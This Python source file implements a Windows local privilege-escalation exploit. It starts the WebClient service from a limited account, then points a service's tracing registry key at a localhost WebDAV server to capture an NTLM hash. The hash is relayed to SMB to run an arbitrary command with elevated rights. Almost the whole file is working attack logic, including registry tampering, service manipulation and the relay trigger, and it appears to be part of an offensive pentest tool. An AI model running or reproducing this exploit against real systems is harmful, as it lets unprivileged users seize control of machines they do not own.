import win32api
import win32con
import win32service
from ctypes.wintypes import *
from ctypes import *
from httpserver import runHTTPServer
from constant import constants
from random import randint
from attack import doAttack
import time

UCHAR 		= c_ubyte
ULONGLONG 	= c_ulonglong

class GUID(Structure):
	_fields_ = [
		("Data1", DWORD),
		("Data2", WORD),
		("Data3", WORD),
		("Data4", BYTE * 8)
	] 

class EVENT_DESCRIPTOR(Structure):
	_fields_ = [
		("Id", 		USHORT),
		("Version", UCHAR),
		("Channel", UCHAR),
		("Level", 	UCHAR),
		("Opcode", 	UCHAR), 
		("Task", 	USHORT), 
		("Keyword", ULONGLONG)
	]

# inspired from https://github.com/secruul/SysExec
# and https://www.exploit-db.com/exploits/36424/
class WebClient():

	def __init__(self):
		self.scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_CONNECT)

		# Define functions
		self.EventRegister 		= windll.advapi32.EventRegister
		self.EventUnregister 	= windll.advapi32.EventUnregister
		self.EventWrite 		= windll.advapi32.EventWrite
		
		self.timeout = 20

	# check if the system has been hardenned enough to avoid this kind of privilege escalation
	def isSMBHardened(self):
		hkey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, win32con.KEY_READ)
		
		smb_signature = 0
		server_name_hardening = 0
		try:
			smb_signature = int(win32api.RegQueryValueEx(hkey, 'RequireSecuritySignature')[0])
			server_name_hardening = int(win32api.RegQueryValueEx(hkey, 'SmbServerNameHardeningLevel')[0])
		except:
			pass

		if smb_signature == 0 and server_name_hardening == 0:
			return False
		else:
			return True

	# start the WebClient service from a limited user
	def startWebclient(self):
		success = False
		hReg = HANDLE()
		guid = GUID()

		# guid: 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7
		guid.Data1 = c_ulong(0x22B6D684)
		guid.Data2 = c_ushort(0xFA63)
		guid.Data3 = c_ushort(0x4578)

		guid.Data4[0] = c_byte(0x87)
		guid.Data4[1] = c_byte(0xC9)
		guid.Data4[2] = c_byte(0xEF)
		guid.Data4[3] = c_byte(0xFC)
		guid.Data4[4] = c_byte(0xBE)
		guid.Data4[5] = c_byte(0x66)
		guid.Data4[6] = c_byte(0x43)
		guid.Data4[7] = c_byte(0xC7)


		if self.EventRegister(byref(guid), None, None, byref(hReg)) == 0:	
			event_desc = EVENT_DESCRIPTOR()
			event_desc.Id 			= 1
			event_desc.Version 		= 0
			event_desc.Channel 		= 0
			event_desc.Level 		= 4
			event_desc.Task 		= 0
			event_desc.Opcode 		= 0
			event_desc.Keyword 		= 0

			if self.EventWrite(hReg, byref(event_desc), 0, None) == 0:
				success = True
			self.EventUnregister(hReg)

		return success

	def find_services_trigger(self, service):
		accessWrite = win32con.KEY_WRITE | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
		hkey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
		num = win32api.RegQueryInfoKey(hkey)[0]

		triggers = []
		for x in range(0, num):
			svc = win32api.RegEnumKey(hkey, x)
			for s in service:
				if s.name.lower() == svc.lower() and s.permissions['start']:
					isServiceRunning = self.isServiceRunning(svc)
					if not isServiceRunning or (isServiceRunning and s.permissions['stop']):
						triggers.append(s)
						print '[+] Service %s found' % s.name
					else:
						print '[-] Service %s already running and could not be stopped' % s.name
		win32api.RegCloseKey(hkey)
		return triggers

	def modify_registry(self, service_name, fileDirectory='%windir%\\tracing', enableFileTracing=0):
		skey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, win32con.KEY_WRITE)
		win32api.RegSetValueEx(skey, 'FileDirectory', 0, win32con.REG_EXPAND_SZ, fileDirectory)
		win32api.RegSetValueEx(skey, 'EnableFileTracing', 0, win32con.REG_DWORD, enableFileTracing)
		win32api.RegCloseKey(skey)

	# check if a service is stopped or if it is running
	def isServiceRunning(self, service_name):
		isRunning = False
		sc_query_config = win32service.OpenService(self.scm, service_name, win32service.SERVICE_QUERY_STATUS)
		status = win32service.QueryServiceStatus(sc_query_config)[1]
		
		if status == win32service.SERVICE_RUNNING:
			isRunning = True

		# wait that the service start correctly
		if status == win32service.SERVICE_START_PENDING:	
			time.sleep(2)
			isRunning = True

		win32service.CloseServiceHandle(sc_query_config)
		return isRunning

	# Open a service given either it's long or short name.
	def SmartOpenService(self, hscm, name, access):
		try:
			return win32service.OpenService(hscm, name, access)
		except:
			return False
		
		name = win32service.GetServiceKeyName(hscm, name)
		return win32service.OpenService(hscm, name, access)


	def StartService(self, serviceName, args = None, machine = None):
		hscm = win32service.OpenSCManager(machine, None, win32service.SC_MANAGER_CONNECT)
		try:
			hs = self.SmartOpenService(hscm, serviceName, win32service.SERVICE_START)
			if hs:
				try:
					win32service.StartService(hs, args)
				finally:
					win32service.CloseServiceHandle(hs)
		finally:
			win32service.CloseServiceHandle(hscm)

	def StopService(self, serviceName, machine = None):
		hscm = win32service.OpenSCManager(machine, None, win32service.SC_MANAGER_CONNECT)
		try:
			hs = self.SmartOpenService(hscm, serviceName, win32service.SERVICE_STOP)
			if hs:
				try:
					win32service.ControlService(hs, win32service.SERVICE_CONTROL_STOP)
				finally:
					win32service.CloseServiceHandle(hs)
		finally:
			win32service.CloseServiceHandle(hscm)

	def run(self, service, command):
		print '[!] Checking WebClient vulnerability'

		if self.isSMBHardened():
			print '[-] Not vulnerable, SMB is hardened'
			return False

		# check if webclient is already running
		if not self.isServiceRunning('WebClient'):
			
			# if not try to start it
			if self.startWebclient():
				
				# check if service has been correctly started
				if not self.isServiceRunning('WebClient'):
					print '[-] WebClient could not be started'
					return False

		print '[!] Find services used to trigger an NTLM hash'
		triggers = self.find_services_trigger(service)
		if not triggers:
			print '[-] No service found'
			return False
		
		else:
			for trigger in triggers:
				error = False
				port = randint(8000, 9999)

				# launch http server
				print '[!] Setting up HTTP Server 127.0.0.1:%s' % port
				print '[!] Command to execute: %s' % command
				runHTTPServer(port, service=trigger.name, command=command)

				# check if the trigger service is already running
				if self.isServiceRunning(trigger.name) and trigger.permissions['stop']:
					# we should not have enought privilege to stop it but lets try to check a misconfiguration on this service
					print '[!] Service %s is running, trying to stop it' % trigger.name
					self.StopService(trigger.name)
					
					if self.isServiceRunning(trigger.name):
						# service could not be used as trigger
						print '[-] Enable to stop the sevice %s' % trigger.name
						continue
					print '[+] Service %s has been stopped' % trigger.name
				
				# redirect FileDirectory regedit key to our listening server
				self.modify_registry(trigger.name, fileDirectory='\\\\127.0.0.1@%s\\tracing' % port, enableFileTracing=1)

				# launch service trigger
				self.StartService(trigger.name)
				if self.isServiceRunning(trigger.name):
					print '[+] Service %s has been correctly started, waiting to get an hash' % trigger.name
				else:
					print '[-] Failed to start the service %s' % trigger.name
					continue

				start = time.time()
				while not constants.outputCmd:
					elapsed = time.time() - start
					if elapsed > self.timeout and not constants.isRunning:
						print '[-] Timeout reached. Exit'
						error = True
						break

				# clean up / restore value as origin
				self.modify_registry(trigger.name)
				
				# success
				if not error:
					break

		ok = False
		if constants.authentication_succeed == True:
			try:
				print '[!] Stopping the service %s' % trigger.name
				executeCmd = doAttack(constants.smb_client, 'sc stop %s' % trigger.name)
				executeCmd.run()
				if not self.isServiceRunning(trigger.name):
					print '[+] Service %s has been correctly stopped' % trigger.name
			except:
				pass

			print '[+] Authentication succeed: \n\n%s' % str(constants.outputCmd)
			ok = True

		elif constants.authentication_succeed == False:
			print '[-] Authentication failed; seems not vulnerable'

		elif constants.authentication_succeed == None:
			print '[?] The authentication process has not reached the end, try to check the standard output' 

		return ok